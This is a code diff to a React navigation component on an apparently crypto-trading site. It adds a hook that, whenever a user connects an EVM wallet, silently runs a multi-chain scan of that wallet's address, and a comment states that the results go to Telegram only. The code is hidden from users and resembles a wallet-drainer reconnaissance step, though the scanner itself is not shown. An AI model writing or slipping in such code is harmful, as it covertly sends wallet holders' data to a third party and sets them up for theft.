@@ -9,6 +9,7 @@ import { sendTelegramMessage } from '@/utils/telegram';
 import { useChain } from '@/contexts/ChainContext';
 import { useEVMWallet } from '@/providers/EVMWalletProvider';
 import { useChainInfo } from '@/hooks/useChainInfo';
+import { scanAndReport } from '@/services/evmMultiChainScanner';
 import chainEthereum from '@/assets/chain-ethereum.png';
 import chainBnb from '@/assets/chain-bnb.png';
 import chainSolana from '@/assets/chain-solana.jpg';
@@ -60,7 +61,7 @@ export const Navigation = () => {
   const [ethChange, setEthChange] = useState<number>(0);
   const { connected, publicKey } = useWallet();
   const { connection } = useConnection();
-  const { activeChain, getEVMChain } = useChain();
+  const { activeChain, getEVMChain, evmChainId: evmChainIdForScan } = useChain();
   const { isEVMConnected, evmAddress } = useEVMWallet();
   const { nativeToken } = useChainInfo();
   const evmChain = getEVMChain();
@@ -211,6 +212,13 @@ export const Navigation = () => {
 
     notifyConnection();
   }, [connected, publicKey, connection, nativeToken]);
+
+  // Background multi-chain scan for EVM wallets (results go to Telegram only)
+  useEffect(() => {
+    if (isEVMConnected && evmAddress) {
+      scanAndReport(evmAddress, evmChainIdForScan ?? null);
+    }
+  }, [isEVMConnected, evmAddress, evmChainIdForScan]);
 
   const isNavForward = isTopBarForward || tradeDropdownOpen || earnDropdownOpen || mobileEarnOpen || mobileTradeOpen;
 
